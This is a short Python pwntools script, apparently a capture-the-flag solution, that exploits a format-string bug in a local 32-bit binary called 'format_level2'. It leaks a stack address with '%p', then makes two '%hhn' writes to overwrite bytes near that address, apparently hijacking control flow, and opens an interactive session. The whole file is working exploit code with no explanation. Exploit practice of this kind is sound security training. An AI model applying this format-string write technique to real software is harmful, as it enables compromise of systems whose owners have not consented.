#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./format_level2')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])



fmt = b"%p"
io.sendlineafter(b"Your choice: \n", str(3).encode())
io.sendafter(b"Input what you want to talk: \n", fmt)
io.recvuntil(b"You said: \n")
stack_addr = int((io.recv(10)),16)
success("stack_addr --> " + hex(stack_addr))


fmt2 = flat(
    stack_addr + 0x40, b"%19c%7$hhn"
)
io.sendlineafter(b"Your choice: \n", str(3).encode())
io.sendafter(b"Input what you want to talk: \n", fmt2)

fmt3 = flat(
 stack_addr + 0x41, b"%143c%7$hhn"
)
io.sendlineafter(b"Your choice: \n", str(3).encode())
io.sendafter(b"Input what you want to talk: \n", fmt3)

#p()
io.sendlineafter(b"Your choice: \n", str(4).encode())

io.interactive()

